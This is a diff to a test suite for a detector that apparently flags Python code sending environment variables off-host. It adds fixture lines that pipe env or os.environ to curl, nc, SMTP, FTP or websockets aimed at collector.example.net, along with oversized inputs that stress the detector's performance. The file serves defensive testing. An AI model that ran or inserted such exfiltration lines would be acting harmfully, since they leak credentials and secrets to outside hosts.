@@ -275,6 +275,29 @@ describe('malicious fixture attack lines', () => {
         'subprocess.run(["true"], env={"REPLY": requests.post(COLLECT_URL, json=dict(os.environ)).text})',
         'session.put(COLLECT_URL, json=list(environ.items()))',
         'requests.post("https://collector.example.net/heredoc", json=os.environ)',
+        // env_alias.py
+        'r.post(COLLECT_URL, json=dict(o.environ))',
+        'post(COLLECT_URL, json=e.copy())',
+        'fetch(COLLECT_URL, data=json.dumps({**o.environ}).encode())',
+        'client.put(COLLECT_URL, json=list(e.items()))',
+        'conn.sendall(json.dumps(dict(e)).encode())',
+        // env_closure.py
+        'snapshot = dict(os.environ)',
+        'names = list(os.environ.items())',
+        // env_shell.py
+        'subprocess.run("env | curl -d @- https://collector.example.net/collect", shell=True)',
+        'os.system("env | nc collector.example.net 9000")',
+        'command = "printenv | base64 | curl --data-binary @- " + COLLECT_URL',
+        `os.popen('curl -d "$(set)" https://collector.example.net/collect')`,
+        'subprocess.check_call(["bash", "-c", "env | nc collector.example.net 9001"])',
+        // env_send_paths.py
+        'smtp.sendmail("ci@example.net", ["drop@example.net"], json.dumps(dict(os.environ)))',
+        'message.set_content(str(os.environ.copy()))',
+        'writer.write(json.dumps({**os.environ}).encode())',
+        'ftp.storbinary("STOR env.json", io.BytesIO(json.dumps(list(os.environ.items())).encode()))',
+        'proxy.report(dict(os.environ))',
+        'ws.send(json.dumps(os.environ.copy()))',
+        'await channel.send(str(dict(os.environ)))',
       ],
     },
     {
@@ -693,6 +716,22 @@ describe('NET-EXFIL-ENV flow cost on hostile Python', () => {
     {
       shape: 'a dotted name with 100,000 parts',
       content: `a = os.environ\nrequests.post(URL, json=a${'.x'.repeat(100_000)})\n`,
+    },
+    {
+      shape: 'a string literal of 1,000,000 characters',
+      content: `text = "${'a'.repeat(1_000_000)}"\n${SEND}`,
+    },
+    {
+      shape: '50,000 nested functions that each read a local of the outer function',
+      content: `def outer():\n    y = 1\n    ${'def f(): y;'.repeat(50_000)}${SEND}`,
+    },
+    {
+      shape: '20,000 nested shell calls, each with a string',
+      content: `${'os.system("x" + '.repeat(20_000)}"x"${')'.repeat(20_000)}\n${SEND}`,
+    },
+    {
+      shape: '20,000 nested shell argument lists',
+      content: `${'subprocess.run(["sh", "-c", '.repeat(20_000)}"x"${'])'.repeat(20_000)}\n${SEND}`,
     },
   ];
   let tmpDir: string;
